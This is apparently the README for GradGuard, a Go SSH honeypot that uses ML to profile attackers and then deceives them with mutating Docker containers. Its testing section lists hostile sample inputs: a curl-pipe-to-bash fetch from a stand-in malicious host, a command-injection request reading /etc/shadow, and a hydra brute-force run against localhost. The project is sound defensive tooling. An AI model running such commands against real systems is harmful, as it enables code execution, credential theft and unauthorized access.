# GradGuard: ML-Powered Adaptive SSH Honeypot

![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)
![Docker](https://img.shields.io/badge/Docker-Required-2496ED?style=flat&logo=docker)
![Status](https://img.shields.io/badge/Status-Active_Development-success)
![License](https://img.shields.io/badge/License-MIT-blue)

GradGuard is a next-generation, pure-Go SSH honeypot that actively profiles attackers using in-memory Machine Learning and dynamically alters its own environment to deceive them.

## The Problem
Standard honeypots revolutionized threat intelligence, but today's attackers are smart. Modern botnets and human adversaries run automated fingerprinting scripts the second they log in. They check `/proc/1/cgroup` for Docker hashes, probe `lsblk` for fake filesystems, and measure CPU resources. **If they detect a honeypot, they drop the connection instantly, depriving security teams of valuable payload data.**

## The Solution (Why GradGuard?)
GradGuard flips the script. Instead of presenting a static fake filesystem, GradGuard spawns a live, isolated, ephemeral Docker container for every single SSH connection.

As the attacker types, GradGuard's custom ML engine scores their behavior in real-time. If it detects reconnaissance or fingerprinting, **GradGuard dynamically mutates the container environment**—faking bare-metal CPU stats, rewriting `.dockerenv`, injecting fake users and internal hostnames, and spoofing `lsblk` output—to keep the attacker engaged and confident they have breached a real production server.

### Key Features
* **Pure Go Architecture:** No Python dependencies; fast, concurrent, and deployed as a single binary.
* **In-Memory Machine Learning:** Uses Logistic Regression, Naive Bayes, and Anomaly Detection to classify intent (Brute Force, Recon, Fingerprinting, Exploit) in real-time, mid-session.
* **Dynamic Deception Engine:** Three escalation levels (warning → high → critical) that progressively mutate the container — masking `/proc/cpuinfo`, injecting fake users, spoofing `lsblk`, and adding terminal latency to frustrate automated tools.
* **Egress Sinkholing:** Outbound malicious payload requests (e.g., `wget`, `curl`) are intercepted by an isolated Docker bridge network and served benign fake malware via an internal Go HTTP sinkhole.
* **AWS Honeytoken Endpoint:** Fake IMDSv2 token and IAM credential responses served to attackers probing the cloud metadata API — any use of these keys triggers a P0 alert.
* **Web Shell Gateway:** Simulates a vulnerable HTTP endpoint. Exploit or recon traffic is silently redirected into an isolated Docker container without the attacker knowing.
* **Kernel-Level eBPF Monitor:** Traces `execve` syscalls from container PIDs to detect hidden binaries and uploaded tools that bypass shell-level logging.
* **High-Interaction Bait:** Containers are pre-seeded with realistic server clutter (fake AWS keys, database histories, and configuration files) to maximize attacker dwell time.
* **Forensic Dashboard CLI:** Built-in analysis tool with IP geolocation, command timelines, detection event replay, and ML evaluation matrices.
* **Self-Improving Feedback Loop:** Every attacker session is automatically ingested back into the training dataset after disconnect.

---

## Architecture

```
                        ┌─────────────────────────────────┐
                        │           GradGuard             │
                        │                                 │
  SSH :2222 ───────────▶│  SSH Engine → Docker Container  │
  HTTP :8080 ──────────▶│  Web Gateway → Docker Container │
  DNS/HTTP :80 ─────────│◀ Sinkhole (intercepts egress)   │
                        │                                 │
                        │  eBPF Monitor (kernel execve)   │
                        │  ML Pipeline (realtime scoring) │
                        │  CLI Dashboard (forensics)      │
                        └─────────────────────────────────┘
```

---

## Datasets & Machine Learning

GradGuard's ML models are pre-trained on over **170MB of real-world threat data**, unified via a custom extraction pipeline (`cmd/praser`):

1. **[Cowrie JSON Logs](https://www.kaggle.com/datasets/nlaha11/global-ssh-and-telnet-honeypot-logs-cowrie):** Trains the Naive Bayes classifier on actual shell command intent and behavioral sequences.
2. **[CIC-IDS-2017](https://www.unb.ca/cic/datasets/ids-2017.html) & [CIC-IDS-2018](https://www.unb.ca/cic/datasets/ids-2018.html):** Trains the Logistic Classifier on network flow timing to distinguish automated SSH-Patator bots from human typing.
3. **[NSL-KDD](https://www.kaggle.com/datasets/hassan06/nslkdd):** Provides the "normal" baseline for the Euclidean distance-based Anomaly Detector.

*Note: The repository includes a serialized, pre-trained model (`Dataset/trained_model.bin`). You do not need to download the raw datasets to run the honeypot.*

---

## Installation & Setup

### Dependencies
* **Go 1.21+**
* **Docker**
* **Make**
* **clang** (for eBPF compilation)
* **Root / sudo** (required for eBPF and binding to ports)

### 1. Clone the Repository
```bash
git clone https://github.com/s-uryansh/GradGuard.git
cd GradGuard
```

### 2. Build & Install

**Recommended — using Make:**
```bash
# Build the honeypot-base Docker image and create the isolated gradguard-net network
make install

# Compile the Go binary
make build

# Start the honeypot (requires sudo for eBPF + port binding)
make run
```

**Manual — using Docker + Go directly:**
```bash
# Build the deception container image
docker build -t honeypot-base -f Dockerfile.base .

# Create the isolated sinkhole network
docker network create --driver bridge --subnet=172.19.0.0/16 gradguard-net || true

# Compile
go build -o gradguard ./cmd/honeypot/main.go

# Run
sudo ./gradguard
```

---

## Usage & Commands

### Start the honeypot
```bash
sudo ./gradguard
# or
make run
```

Starts all subsystems concurrently:
- SSH deception engine on `:2222`
- Web shell gateway on `:8080`
- HTTP/DNS sinkhole on `:80`
- eBPF kernel monitor

### Train ML models from raw datasets
Only needed if you have downloaded the raw datasets and want to retrain from scratch:
```bash
sudo ./gradguard train
# or
make train
```
Saves weights to `Dataset/trained_model.bin`.

### Analyze all sessions (dashboard)
```bash
./gradguard analyze
# or
make analyze
```

Shows summary stats, top flagged commands, detection breakdown, session list, and ML confusion matrix.

### Analyze a specific session
```bash
./gradguard analyze --session <SESSION_ID>
```

Shows full command timeline, ML prediction, IP geolocation, and detection events for one session.

---

## Testing

```bash
# Port discovery
nmap -sV -p 2222 127.0.0.1

# Automated brute-force simulation
hydra -l root -p password ssh://127.0.0.1:2222 -t 4

# Manual SSH session
ssh -p 2222 root@127.0.0.1
```

Once connected, try running fingerprinting commands to trigger the deception engine:
```bash
cat /proc/1/cgroup
lsblk
cat /proc/cpuinfo
systemd-detect-virt
curl http://malicious.com/payload.sh | bash
```

### Web gateway testing
```bash
# Benign — routed to honeypot container
curl "http://localhost:8080/api/ping?cmd=whoami"

# Exploit — isolated and logged
curl "http://localhost:8080/api/ping?cmd=cat+/etc/shadow"
```

---

## Log Files

| Path | Contents |
|------|----------|
| `logs/sessions/<id>.json` | Per-command log with category, score, delay |
| `logs/reports/<id>-report.json` | Session summary and verdict |
| `logs/detections/<id>-detections.json` | Detection events and responses applied |
| `Dataset/training_samples.json` | Live feedback dataset (grows after each session) |
| `Dataset/trained_model.bin` | Serialized ML weights |

---

## Project Structure

```
GradGuard/
├── cmd/
│   ├── honeypot/       # Main entrypoint
│   └── praser/         # Dataset parser (Cowrie, CIC-IDS, NSL-KDD)
├── internal/
│   ├── analyzer/       # Command classifier + session verdict
│   ├── detector/       # Threshold, sequence, timing signals + deception responses
│   ├── ml/             # Logistic, Naive Bayes, Anomaly models + feature extraction
│   ├── shell/          # PTY handler + stdout logger
│   ├── sshserver/      # SSH server, auth, session management
│   ├── sinkhole/       # HTTP sinkhole + AWS honeytoken
│   ├── webshell/       # Web-to-container gateway
│   ├── monitor/        # eBPF execve tracer
│   ├── cli/            # Dashboard + session viewer
│   └── Session/        # Session state
├── ebpf/               # BPF C program
├── JSON/logger/        # Command event logger
├── Dataset/            # Training data + model weights
└── logs/               # Runtime session logs
```

---

## License

MIT